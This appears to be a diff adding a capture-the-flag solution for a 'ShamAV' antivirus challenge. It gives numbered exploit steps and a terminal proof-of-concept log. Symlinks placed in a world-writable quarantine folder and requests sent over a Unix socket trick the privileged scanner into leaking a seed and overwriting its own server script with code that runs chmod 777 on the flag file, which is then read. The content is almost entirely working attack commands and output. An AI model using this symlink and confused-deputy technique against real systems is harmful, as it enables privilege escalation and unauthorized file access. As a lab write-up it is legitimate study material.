@@ -1,0 +1,75 @@
+1. ln -s ../seed /home/antivirus/quarantine/test2
+
+2. echo -n "/home/antivirus/quarantine/test2" | socat - "UNIX-CONNECT:/home/antivirus/socket"
+
+3. cat /home/antivirus/quarantine/*
+
+get seed and insert to file gen_random.py
+4. python gen_random.py
+
+5. Run command from python gen_random.py
+
+6. echo -e "#! /usr/bin/env python3
+import os
+os.system('chmod 777 /home/antivirus/flag.txt')
+" > run.py
+
+7. echo -n "/home/ctf/run.py" | socat - "UNIX-CONNECT:/home/antivirus/socket"
+
+8. ln -s ../flag.txt /home/antivirus/quarantine/test
+
+9. echo -n "/home/antivirus/quarantine/test" | socat - "UNIX-CONNECT:/home/antivirus/socket"
+
+10. cat /home/antivirus/flag.txt 
+
+
+---------- POC
+
+== proof-of-work: disabled ==
+Welcome to a ShamAV-protected demo system
+To scan a file for malware, run
+
+scan /path/to/file
+
+ctf@SHAMAV:~$ ln -s ../seed /home/antivirus/quarantine/test2
+
+<t2" | socat - "UNIX-CONNECT:/home/antivirus/socket"
+File scan completed. No malware detected.
+
+ctf@SHAMAV:~$ cat /home/antivirus/quarantine/*
+WSudp1zsdH8FsjqTjugy8t2yPjyFSX/3+aVO3T0XJTY=
+cat: /home/antivirus/quarantine/test2: Permission denied
+
+ctf@SHAMAV:~$ echo -e "#! /usr/bin/env python3
+> import os
+> os.system('chmod 777 /home/antivirus/flag.txt')
+> " > run.py
+
+<0e7410af11b878beb309532d00f685fbe4cb60778a0318ef83e
+
+<py" | socat - "UNIX-CONNECT:/home/antivirus/socket"
+File scan completed. No malware detected.
+
+ctf@SHAMAV:~$ cat /home/antivirus/server.py
+#! /usr/bin/env python3
+import os
+os.system('chmod 777 /home/antivirus/flag.txt')
+
+ctf@SHAMAV:~$ ln -s ../flag.txt /home/antivirus/quarantine/test
+<st" | socat - "UNIX-CONNECT:/home/antivirus/socket"
+
+ctf@SHAMAV:~$ ls -la /home/antivirus/
+total 28
+drwxr-xr-x 3 antivirus antivirus  200 May  7 17:45 .
+drwxr-xr-x 5 nobody    nogroup   4096 May  4 23:22 ..
+-rw-r--r-- 1 antivirus antivirus 2030 May  7 17:46 av.log
+-rwxrwxrwx 1 antivirus antivirus   44 May  7 17:45 flag.txt
+-rwxr-xr-x 1 antivirus antivirus  673 May  7 17:45 launcher.sh
+-rw-r--r-- 1 antivirus antivirus  260 May  7 17:45 malware-hashes.txt
+drwxrwxrwx 2 antivirus antivirus  120 May  7 17:46 quarantine
+-rw------- 1 antivirus antivirus   45 May  7 17:46 seed
+-rwxr-xr-x 1 antivirus antivirus   83 May  7 17:46 server.py
+srwxrwxrwx 1 antivirus antivirus    0 May  7 17:45 socket
+
+ctf@SHAMAV:~$ cat /home/antivirus/flag.txt 
+sdctf{5ymL1Nks_ar3_4_curs3d_f3a7uRe_0f_*NIX}
